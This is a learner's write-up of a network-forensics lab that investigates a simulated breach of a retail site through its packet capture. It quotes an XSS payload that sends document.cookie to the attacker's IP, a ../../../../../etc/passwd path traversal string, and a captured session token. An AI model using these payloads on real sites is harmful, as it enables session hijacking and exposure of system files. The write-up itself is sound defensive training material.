# Lab Investigation: RetailBranch Lab

| Metadata | Details |
| :--- | :--- |
| **Platform** | CyberDefenders
| **Category** | Network Forensics |
| **Difficulty** | Easy |
| **Tactics** | Reconnaissance, Initial Access, Execution, Credential Access, Discovery, Lateral Movement |
| **Primary Tools Used** | `Wireshark`, `CyberChef`, `Brim`|

---

## Incident Scenario & Objective

> **Scenario:** In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise. Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

---

## Lab Questions & Findings

### Q1 - Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?

Alright, so after opening *RetailBreach.pcap* file on Wireshark (I'm more comfortable using Wireshark considering it's primarily what I use at university), I opened endpoints from the statistics menu.

(see screenshot 1 in the *screenshots_retailbreach* folder.)

clicking on IPv4, there are some IP addresses. We need to determine which of the three is the attacker's IP - and when looking at the incoming requests, we can see which one it is fairly easily. 

(see screenshot 2 in the *screenshots_retailbreach* folder.)

### Q2 - The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?

Directory brute-forcing is a type of attack where the attacker(s) try to find restricted or hidden directories, files, folders, web pages etc. by guessing their names, often using a wordlist. Attackers usually use a automated tool to send thousands of requests until they eventually find something. 

Since a lot of brute-forcing tools use a custom user-agent, they don't strictly follow the standard format used by the standard web browsers. Upon filtering for HTTP requests from that specific IP address and following a couple of the packets, the user-agent for them all is the same.

(see screenshot 3 in the *screenshots_retailbreach* folder.)

The user-agent was *gobuster*, which is a open-source tool writtein in Go which is used for brute-forcing. So, this must be the tool that the attacker is using!

### Q3 - Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

Cross-site scripting is where the attacker attaches code onto a legit website (in this case, ShopSphere) that will execute when the victim loads the website, which will then send the victim's private data to the attacker. 

So... since they use a script, we can filter the search in Wireshark for words containing "script"

(see screenshot 4 in the *screenshots_retailbreach* folder.)

We know that the HTTP requests use GET, but one of them at the bottom uses POST on /reviews.php. Following it, we can see the URL used by the attacker. 

Using CyberChef we can decode the URL. It churns out `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`, which is the correct answer. 

(see screenshot 5 in the *screenshots_retailbreach* folder.)

### Q4 - Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?

Well, we know from earlier that we had *3* IP addresses. One of them was the attacker, one of them must be the platform server, and the remainder must be the admin. 

It's fairly obvious which one is the server address considering that the GET requests are between the attacker - 111.224.180.128 - with the destination being the server, 73.124.17.52. So that must mean that IP address 135.143.142.5 is the admin. 

Filtering out the HTTP traffic with that IP address, I spotted the review.php in one of the packets. I changed the time column to be year-month-date hour:minute:second, I inputted the answer into the question and got it correct.

It was 2024-03-29 at 12:09. 

(see screenshot 6 in the *screenshots_retailbreach* folder.)

### Q5 - The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?

A session token identifies and tracks the user's session within a user's application after they had been logged in so users don't have to type in their password at every single web page. But since this attacker steals the users' session cookies and the admin already visited the website, they can retrieve the session token.

So, following the HTTP stream of the previous packet, it tells us the set-cookie: lqkctf24s9h9lg67teu8uevn3q. 

(see screenshot 7 in the *screenshots_retailbreach* folder.)

### Q6 - Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?

So since the attacker can't do anything until after recieving the session token, we should filter all the packets by the attacker's IP address after the admin's packet where their token / cookie was stolen.

(see screenshot 8 in the *screenshots_retailbreach* folder.)

Following at one of the packets, there is a php file called *log_viewer.php* and inputting that answer in confirms that it is the name of the script exploited.

(see screenshot 9 in the *screenshots_retailbreach* folder.)

### Q7 - Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?

After looking at the format of the answer - I had no idea what it could be. Then I realised I put in the wrong IP address... whoops.. Well, after using the right one this time, it was immediately clear what payload the attacker used from the information of one of the packets - ../../../../../etc/passwd

(see screenshot 10 in the *screenshots_retailbreach* folder.)

## Verdict and incident recommendations 

### Verdict

The investigation concluded that ShopShphere was compromised by an attacker using multiple methods. First, using Gobuster and performing a directory brute-forcing attack, then exploiting a Cross-Site Scripting (XSS) vulnerability and injecting a malicious payload to extract a admin's session cookie.

At around 2024-03-29 12:09 UTC, the admin's cookie was exposed to the attacker, and the attacker used it to access the application as an administrator. Then, they accessed log_viewer.php and used a path traversal payload, allowing them access to /etc/passwd system file.

### Remediation Steps

1. Fix the XSS vulnerability
2. Protect session tokens 
3. Fix the path traversal vulberability
4. Restrict admin pages to authorised admin and apply the principle of least prvilege so the web application has only the permissions it requires.
5. Review the compromised system for anything else that may have been compromised (accounts, files, sessions).
6. Improve brute-force and attack detection.

## Closing thoughts

Thank you for reading! This was fun to do, fairly simple too. I'm still experimenting with formatting and such so hopefully this template is good enough. I feel like it's a little too boring still, but it's getting better. I'm a very visual person, I enjoy things looking good since it makes me pay attention more to it and read more carefully, so I would assume others would be the same.

## References + achievement 

https://www.kali.org/tools/gobuster/ 
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/immy1482/retailbreach/ 